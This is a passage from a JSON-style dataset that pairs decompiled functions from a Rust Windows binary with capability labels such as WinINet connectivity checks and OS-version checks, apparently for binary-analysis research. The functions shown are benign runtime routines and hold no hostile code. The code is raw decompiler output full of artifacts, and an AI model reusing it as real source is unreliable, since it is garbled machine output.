0x1f, 0) & 1) << 3 |\n                (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (-(arg1[0xf] == '\\0') >> 7) << 0xf;\n        if (uVar7 == 0) {\n            pcVar9 = (arg1 & 0xfffffffffffffff0) + 0x10;\n            if ((0x3f < arg2) && (pcVar9 <= pcVar1 + -0x40)) {\n                iVar10 = 0x40 - (arg1 & 0xf);\n                do {\n                    pcVar2 = arg1 + iVar10 + -0x30;\n                    pcVar3 = arg1 + iVar10 + -0x20;\n                    pcVar4 = arg1 + iVar10 + -0x10;\n                    pcVar9 = arg1 + iVar10;\n                    auVar13 = CONCAT115(-(pcVar9[0xf] == '\\0'), \n                                        CONCAT114(-(pcVar9[0xe] == '\\0'), \n                                                  CONCAT113(-(pcVar9[0xd] == '\\0'), \n                                                            CONCAT112(-(pcVar9[0xc] == '\\0'), \n                                                                      CONCAT111(-(pcVar9[0xb] == '\\0'), \n                                                                                CONCAT110(-(pcVar9[10] == '\\0'), \n                                                                                          CONCAT19(-(pcVar9[9] == '\\0')\n                                                                                                   , CONCAT18(-(pcVar9[8\n                                                            ] == '\\0'), \n                                                            CONCAT17(-(pcVar9[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar9[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar9[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar9[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar9[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar9[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar9[1] == '\\0'), -(*pcVar9 == '\\0')))\n                                                            ))))))))))))) |\n                              CONCAT115(-(pcVar4[0xf] == '\\0'), \n                                        CONCAT114(-(pcVar4[0xe] == '\\0'), \n                                                  CONCAT113(-(pcVar4[0xd] == '\\0'), \n                                                            CONCAT112(-(pcVar4[0xc] == '\\0'), \n                                                                      CONCAT111(-(pcVar4[0xb] == '\\0'), \n                                                                                CONCAT110(-(pcVar4[10] == '\\0'), \n                                                                                          CONCAT19(-(pcVar4[9] == '\\0')\n                                                                                                   , CONCAT18(-(pcVar4[8\n                                                            ] == '\\0'), \n                                                            CONCAT17(-(pcVar4[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar4[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar4[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar4[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar4[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar4[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar4[1] == '\\0'), -(*pcVar4 == '\\0')))\n                                                            ))))))))))))) |\n                              CONCAT115(-(pcVar3[0xf] == '\\0'), \n                                        CONCAT114(-(pcVar3[0xe] == '\\0'), \n                                                  CONCAT113(-(pcVar3[0xd] == '\\0'), \n                                                            CONCAT112(-(pcVar3[0xc] == '\\0'), \n                                                                      CONCAT111(-(pcVar3[0xb] == '\\0'), \n                                                                                CONCAT110(-(pcVar3[10] == '\\0'), \n                                                                                          CONCAT19(-(pcVar3[9] == '\\0')\n                                                                                                   , CONCAT18(-(pcVar3[8\n                                                            ] == '\\0'), \n                                                            CONCAT17(-(pcVar3[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar3[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar3[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar3[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar3[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar3[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar3[1] == '\\0'), -(*pcVar3 == '\\0')))\n                                                            ))))))))))))) |\n                              CONCAT115(-(pcVar2[0xf] == '\\0'), \n                                        CONCAT114(-(pcVar2[0xe] == '\\0'), \n                                                  CONCAT113(-(pcVar2[0xd] == '\\0'), \n                                                            CONCAT112(-(pcVar2[0xc] == '\\0'), \n                                                                      CONCAT111(-(pcVar2[0xb] == '\\0'), \n                                                                                CONCAT110(-(pcVar2[10] == '\\0'), \n                                                                                          CONCAT19(-(pcVar2[9] == '\\0')\n                                                                                                   , CONCAT18(-(pcVar2[8\n                                                            ] == '\\0'), \n                                                            CONCAT17(-(pcVar2[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar2[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar2[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar2[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar2[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar2[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar2[1] == '\\0'), -(*pcVar2 == '\\0')))\n                                                            )))))))))))));\n                    if ((SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | SUB161(auVar13 >> 0x7f, 0) << 0xf) != 0) {\n                        uVar12 = -(pcVar2[0xf] == '\\0');\n                        auVar13 = CONCAT115(uVar12, CONCAT114(-(pcVar2[0xe] == '\\0'), \n                                                              CONCAT113(-(pcVar2[0xd] == '\\0'), \n                                                                        CONCAT112(-(pcVar2[0xc] == '\\0'), \n                                                                                  CONCAT111(-(pcVar2[0xb] == '\\0'), \n                                                                                            CONCAT110(-(pcVar2[10] ==\n                                                                                                       '\\0'), CONCAT19(-\n                                                            (pcVar2[9] == '\\0'), \n                                                            CONCAT18(-(pcVar2[8] == '\\0'), \n                                                                     CONCAT17(-(pcVar2[7] == '\\0'), \n                                                                              CONCAT16(-(pcVar2[6] == '\\0'), \n                                                                                       CONCAT15(-(pcVar2[5] == '\\0'), \n                                                                                                CONCAT14(-(pcVar2[4] ==\n                                                                                                          '\\0'), \n                                                            CONCAT13(-(pcVar2[3] == '\\0'), \n                                                                     CONCAT12(-(pcVar2[2] == '\\0'), \n                                                                              CONCAT11(-(pcVar2[1] == '\\0'), \n                                                                                       -(*pcVar2 == '\\0'))))))))))))))))\n                        ;\n                        uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                                (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                                (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                                (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                                (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf;\n                        if (uVar7 != 0) {\n                            iVar5 = 0;\n                            if (uVar7 == 0) {\n                                return 1;\n                            }\n                            for (; (uVar7 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n                            }\n                            return 1;\n                        }\n                        uVar12 = -(pcVar3[0xf] == '\\0');\n                        auVar13 = CONCAT115(uVar12, CONCAT114(-(pcVar3[0xe] == '\\0'), \n                                                              CONCAT113(-(pcVar3[0xd] == '\\0'), \n                                                                        CONCAT112(-(pcVar3[0xc] == '\\0'), \n                                                                                  CONCAT111(-(pcVar3[0xb] == '\\0'), \n                                                                                            CONCAT110(-(pcVar3[10] ==\n                                                                                                       '\\0'), CONCAT19(-\n                                                            (pcVar3[9] == '\\0'), \n                                                            CONCAT18(-(pcVar3[8] == '\\0'), \n                                                                     CONCAT17(-(pcVar3[7] == '\\0'), \n                                                                              CONCAT16(-(pcVar3[6] == '\\0'), \n                                                                                       CONCAT15(-(pcVar3[5] == '\\0'), \n                                                                                                CONCAT14(-(pcVar3[4] ==\n                                                                                                          '\\0'), \n                                                            CONCAT13(-(pcVar3[3] == '\\0'), \n                                                                     CONCAT12(-(pcVar3[2] == '\\0'), \n                                                                              CONCAT11(-(pcVar3[1] == '\\0'), \n                                                                                       -(*pcVar3 == '\\0'))))))))))))))))\n                        ;\n                        uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                                (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                                (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                                (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                                (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf;\n                        if (uVar7 != 0) {\n                            iVar5 = 0;\n                            if (uVar7 == 0) {\n                                return 1;\n                            }\n                            for (; (uVar7 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n                            }\n                            return 1;\n                        }\n                        uVar12 = -(pcVar4[0xf] == '\\0');\n                        auVar13 = CONCAT115(uVar12, CONCAT114(-(pcVar4[0xe] == '\\0'), \n                                                              CONCAT113(-(pcVar4[0xd] == '\\0'), \n                                                                        CONCAT112(-(pcVar4[0xc] == '\\0'), \n                                                                                  CONCAT111(-(pcVar4[0xb] == '\\0'), \n                                                                                            CONCAT110(-(pcVar4[10] ==\n                                                                                                       '\\0'), CONCAT19(-\n                                                            (pcVar4[9] == '\\0'), \n                                                            CONCAT18(-(pcVar4[8] == '\\0'), \n                                                                     CONCAT17(-(pcVar4[7] == '\\0'), \n                                                                              CONCAT16(-(pcVar4[6] == '\\0'), \n                                                                                       CONCAT15(-(pcVar4[5] == '\\0'), \n                                                                                                CONCAT14(-(pcVar4[4] ==\n                                                                                                          '\\0'), \n                                                            CONCAT13(-(pcVar4[3] == '\\0'), \n                                                                     CONCAT12(-(pcVar4[2] == '\\0'), \n                                                                              CONCAT11(-(pcVar4[1] == '\\0'), \n                                                                                       -(*pcVar4 == '\\0'))))))))))))))))\n                        ;\n                        uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                                (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                                (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                                (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                                (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf;\n                        if (uVar7 != 0) {\n                            iVar5 = 0;\n                            if (uVar7 == 0) {\n                                return 1;\n                            }\n                            for (; (uVar7 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n                            }\n                            return 1;\n                        }\n                        uVar12 = -(pcVar9[0xf] == '\\0');\n                        auVar13 = CONCAT115(uVar12, CONCAT114(-(pcVar9[0xe] == '\\0'), \n                                                              CONCAT113(-(pcVar9[0xd] == '\\0'), \n                                                                        CONCAT112(-(pcVar9[0xc] == '\\0'), \n                                                                                  CONCAT111(-(pcVar9[0xb] == '\\0'), \n                                                                                            CONCAT110(-(pcVar9[10] ==\n                                                                                                       '\\0'), CONCAT19(-\n                                                            (pcVar9[9] == '\\0'), \n                                                            CONCAT18(-(pcVar9[8] == '\\0'), \n                                                                     CONCAT17(-(pcVar9[7] == '\\0'), \n                                                                              CONCAT16(-(pcVar9[6] == '\\0'), \n                                                                                       CONCAT15(-(pcVar9[5] == '\\0'), \n                                                                                                CONCAT14(-(pcVar9[4] ==\n                                                                                                          '\\0'), \n                                                            CONCAT13(-(pcVar9[3] == '\\0'), \n                                                                     CONCAT12(-(pcVar9[2] == '\\0'), \n                                                                              CONCAT11(-(pcVar9[1] == '\\0'), \n                                                                                       -(*pcVar9 == '\\0'))))))))))))))))\n                        ;\n                        uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                                (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                                (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                                (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                                (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf;\n                        if (uVar7 == 0) {\n                            return 1;\n                        }\n                        iVar6 = 0;\n                        if (uVar7 == 0) {\n                            return 1;\n                        }\n                        for (; (uVar7 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {\n                        }\n                        return 1;\n                    }\n                    iVar10 = iVar10 + uVar11;\n                    pcVar9 = arg1 + iVar10 + -0x30;\n                } while (pcVar9 <= pcVar1 + -0x40);\n            }\n            for (; pcVar9 <= pcVar1 + -0x10; pcVar9 = pcVar9 + 0x10) {\n                auVar13 = CONCAT115(-(pcVar9[0xf] == '\\0'), \n                                    CONCAT114(-(pcVar9[0xe] == '\\0'), \n                                              CONCAT113(-(pcVar9[0xd] == '\\0'), \n                                                        CONCAT112(-(pcVar9[0xc] == '\\0'), \n                                                                  CONCAT111(-(pcVar9[0xb] == '\\0'), \n                                                                            CONCAT110(-(pcVar9[10] == '\\0'), \n                                                                                      CONCAT19(-(pcVar9[9] == '\\0'), \n                                                                                               CONCAT18(-(pcVar9[8] ==\n                                                                                                         '\\0'), CONCAT17\n                                                            (-(pcVar9[7] == '\\0'), \n                                                             CONCAT16(-(pcVar9[6] == '\\0'), \n                                                                      CONCAT15(-(pcVar9[5] == '\\0'), \n                                                                               CONCAT14(-(pcVar9[4] == '\\0'), \n                                                                                        CONCAT13(-(pcVar9[3] == '\\0'), \n                                                                                                 CONCAT12(-(pcVar9[2] ==\n                                                                                                           '\\0'), \n                                                            CONCAT11(-(pcVar9[1] == '\\0'), -(*pcVar9 == '\\0'))))))))))))\n                                                            ))));\n                uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (-(pcVar9[0xf] == '\\0') >> 7) << 0xf;\n                if (uVar7 != 0) {\n                    iVar5 = 0;\n                    if (uVar7 == 0) {\n                        return 1;\n                    }\n                    for (; (uVar7 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n                    }\n                    return 1;\n                }\n            }\n            if (pcVar9 < pcVar1) {\n                auVar13 = CONCAT115(-(pcVar1[-1] == '\\0'), \n                                    CONCAT114(-(pcVar1[-2] == '\\0'), \n                                              CONCAT113(-(pcVar1[-3] == '\\0'), \n                                                        CONCAT112(-(pcVar1[-4] == '\\0'), \n                                                                  CONCAT111(-(pcVar1[-5] == '\\0'), \n                                                                            CONCAT110(-(pcVar1[-6] == '\\0'), \n                                                                                      CONCAT19(-(pcVar1[-7] == '\\0'), \n                                                                                               CONCAT18(-(pcVar1[-8] ==\n                                                                                                         '\\0'), CONCAT17\n                                                            (-(pcVar1[-9] == '\\0'), \n                                                             CONCAT16(-(pcVar1[-10] == '\\0'), \n                                                                      CONCAT15(-(pcVar1[-0xb] == '\\0'), \n                                                                               CONCAT14(-(pcVar1[-0xc] == '\\0'), \n                                                                                        CONCAT13(-(pcVar1[-0xd] == '\\0')\n                                                                                                 , CONCAT12(-(pcVar1[\n                                                            -0xe] == '\\0'), \n                                                            CONCAT11(-(pcVar1[-0xf] == '\\0'), -(pcVar1[-0x10] == '\\0')))\n                                                            )))))))))))));\n                uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (-(pcVar1[-1] == '\\0') >> 7) << 0xf;\n                if (uVar7 != 0) {\n                    iVar5 = 0;\n                    if (uVar7 == 0) {\n                        return 1;\n                    }\n                    for (; (uVar7 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n                    }\n                    return 1;\n                }\n            }\n            return 0;\n        }\n        iVar5 = 0;\n        if (uVar7 != 0) {\n            for (; (uVar7 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 6975
    },
    "b3d37733": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.alloc::sync::Arc_T_::drop_slow::hb3d3773341c3a41a(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    // alloc::sync::Arc<T>::drop_slow::hb3d3773341c3a41a\n    iVar2 = *arg1;\n    if ((*(iVar2 + 0x10) != NULL) && (**(iVar2 + 0x10) = 0,  *(iVar2 + 0x18) != 0)) {\n        sym.__rust_dealloc(*(iVar2 + 0x10), 1);\n    }\n    if (iVar2 != -1) {\n        LOCK();\n        piVar1 = iVar2 + 8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "eb664d74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.once_cell::imp::initialize_or_wait::heb664d7426bc1566(uint64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    uint32_t uVar7;\n    bool bVar9;\n    uint64_t uStack176;\n    uint64_t uStack168;\n    uint64_t uStack160;\n    char cStack152;\n    int64_t iStack144;\n    int32_t iStack132;\n    int64_t iStack128;\n    ulong uStack120;\n    ulong uStack112;\n    int32_t **ppiStack96;\n    ulong uStack88;\n    int32_t *piStack80;\n    code *pcStack72;\n    uint64_t uVar8;\n    \n    // once_cell::imp::initialize_or_wait::heb664d7426bc1566\n    uVar4 = *arg1;\n    iStack144 = arg3;\ncode_r0x0040e441:\n    while( true ) {\n        uVar7 = uVar4 & 3;\n        uVar8 = uVar7;\n        while (uVar8 != 0) {\n            if (uVar7 == 1) goto code_r0x0040e481;\n            if (uVar7 == 2) {\n                return;\n            }\n        }\n        if (arg2 == 0) break;\n        LOCK();\n        bVar9 = uVar4 == *arg1;\n        *arg1 = *arg1 ^ bVar9 * (*arg1 ^ (uVar4 & 0xfffffffffffffffc | 1));\n        uVar4 = uVar4 ^ !bVar9 * (uVar4 ^ *arg1);\n        if (bVar9) {\n            uVar3 = (**(iStack144 + 0x20))();\n            uVar4 = *arg1;\n            *arg1 = uVar3 * 2;\n            uStack168 = uVar4 & 3;\n            if (uStack168 != 1) {\n                iStack128 = 0;\n                sym.core::panicking::assert_failed::h272e868455368c21(&uStack168, 0x4483d0, &iStack128, 0x448440);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar6 = uVar4 - 1;\n            while( true ) {\n                if (piVar6 == NULL) {\n                    return;\n                }\n                piVar5 = piVar6[1];\n                iVar1 = *piVar6;\n                *piVar6 = 0;\n                if (iVar1 == 0) break;\n                *(piVar6 + 2) = 1;\n                iStack128 = iVar1;\n                sym.std::sys::windows::thread_parker::Parker::unpark::hd9df56576925fe3c(iVar1 + 0x28);\n                sym.core::ptr::drop_in_place_std::thread::Thread_::hb9c65ebb13248904(&iStack128);\n                piVar6 = piVar5;\n            }\n            dbg.panic(0x44bcbb, 0x2b, 0x448458);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\ncode_r0x0040e481:\n    do {\n        uStack168 = sym.std::thread::current::h3d8599afe262ad96();\n        uStack160 = uVar4 & 0xfffffffffffffffc;\n        cStack152 = '\\0';\n        LOCK();\n        bVar9 = uVar4 == *arg1;\n        *arg1 = *arg1 ^ bVar9 * (*arg1 ^ &uStack168 + uVar8);\n        uVar4 = uVar4 ^ !bVar9 * (uVar4 ^ *arg1);\n        if (bVar9) goto code_r0x0040e594;\n        sym.core::ptr::drop_in_place_once_cell::imp::Waiter_::h68af502c455c387f(&uStack168);\n    } while ((uVar4 & 3) == uVar8);\n    goto code_r0x0040e5a8;\ncode_r0x0040e594:\n    while (cStack152 == '\\0') {\n        piVar5 = sym.std::thread::current::h3d8599afe262ad96();\n        LOCK();\n        piVar6 = piVar5 + 5;\n        *piVar6 = *piVar6 + -1;\n        pcVar2 = *0x4520f0;\n        if (*piVar6 != '\\0') {\n            piVar6 = piVar5 + 5;\n            if (*0x4520f0 == NULL) {\n                uVar4 = *0x443088;\n                if (*0x443088 == 0xffffffffffffffff) {\n                    uStack176 = 0xffffffffffffffff;\n                    iStack132 = (**0x4430b0)(&uStack176, 0xc0000000, 0, 0);\n                    if (iStack132 != 0) {\n                        piStack80 = &iStack132;\n                        ppiStack96 = &piStack80;\n                        iStack128 = 0x44b4b8;\n                        uStack120 = 1;\n                        uStack112 = 0;\n                        pcStack72 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_i32_::fmt::hff6e31fbf33ddf61;\n                        uStack88 = 1;\n                        dbg.panic_fmt(&iStack128, 0x44b4f8);\n                        do {\n                            invalidInstructionException();\n                        } while( true );\n                    }\n                    LOCK();\n                    bVar9 = *0x443088 == 0xffffffffffffffff;\n                    *0x443088 = *0x443088 ^ bVar9 * (*0x443088 ^ uStack176);\n                    uVar8 = *0x443088 ^ 0xffffffffffffffff;\n                    uVar4 = uStack176;\n                    if (!bVar9) {\n                        sub.KERNEL32.dll_CloseHandle();\n                        uVar4 = !bVar9 * uVar8 ^ 0xffffffffffffffff;\n                    }\n                }\n                (**0x4430c0)(uVar4, piVar6);\n                *piVar6 = 0;\n            }\n            else {\n                do {\n                    (*pcVar2)(piVar6, 0x449740);\n                    LOCK();\n                    uVar3 = *piVar6;\n                    *piVar6 = *piVar6 ^ (uVar3 == 1) * *piVar6;\n                } while (uVar3 != 1);\n            }\n        }\n        LOCK();\n        *piVar5 = *piVar5 + -1;\n        if (*piVar5 == 0) {\n            dbg.drop_slow<std::thread::Inner>(piVar5);\n        }\n    }\n    sym.core::ptr::drop_in_place_once_cell::imp::Waiter_::h68af502c455c387f(&uStack168);\ncode_r0x0040e5a8:\n    uVar4 = *arg1;\n    goto code_r0x0040e441;\n}\n",
        "token_count": 1613
    },
    "68af502c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_once_cell::imp::Waiter_::h68af502c455c387f(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    \n    // core::ptr::drop_in_place<once_cell::imp::Waiter>::h68af502c455c387f\n    if (*arg1 == NULL) {\n        return;\n    }\n    piVar2 = *arg1;\n    LOCK();\n    *piVar2 = *piVar2 + -1;\n    if (*piVar2 != 0) {\n        return;\n    }\n    piVar2 = *arg1;\n    if ((piVar2[2] != NULL) && (*piVar2[2] = 0,  piVar2[3] != 0)) {\n        sym.__rust_dealloc(piVar2[2], 1);\n    }\n    if (piVar2 != 0xffffffffffffffff) {\n        LOCK();\n        piVar1 = piVar2 + 1;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, piVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "209ca700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
